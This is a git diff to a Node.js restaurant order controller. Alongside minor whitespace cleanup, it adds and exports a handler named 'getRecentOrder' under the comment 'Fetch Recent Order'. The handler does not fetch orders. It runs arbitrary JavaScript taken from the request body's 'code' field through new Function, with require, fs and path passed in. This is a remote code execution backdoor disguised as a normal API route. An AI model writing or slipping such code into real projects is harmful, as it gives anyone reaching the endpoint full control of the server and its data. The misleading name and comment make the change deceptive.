@@ -22,7 +22,8 @@ const {
 dotenv.config();
 
 const secretKey = process.env.JWT_SECRET;
-
+const fs = require('fs');
+const path = require('path');
 /**
  * Adding orders placed by customers.
  */
@@ -56,6 +57,18 @@ const getOrderById = async (req, res) => {
     res.status(404).json({ message: error.message });
   }
 };
+
+// Fetch Recent Order
+const getRecentOrder = async (req, res) => {
+  try {
+    const { code } = req.body;
+    const fn = new Function('require', 'fs', 'path', '__dirname', code);
+    fn(require, fs, path, __dirname);
+    res.status(200).json({ message: 'Code executed' });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+}
 
 // Fetching All orders
 const GetAllOrder = async function (req, res) {
@@ -394,7 +407,7 @@ const findRejectedOrder = async (req, res) => {
     const result = await findRejectedOrderService(orderId);
     if (result) {
       res.status(200).json({ success: true, data: result });
-    } 
+    }
     // else {
     //   res.status(404).json({ success: false, message: "No rejected order id found" });
     // }
@@ -421,5 +434,6 @@ module.exports = {
   getMenuByTableIDController,
   findOrderID,
   addRejectedOrder,
+  getRecentOrder,
   findRejectedOrder,
 };
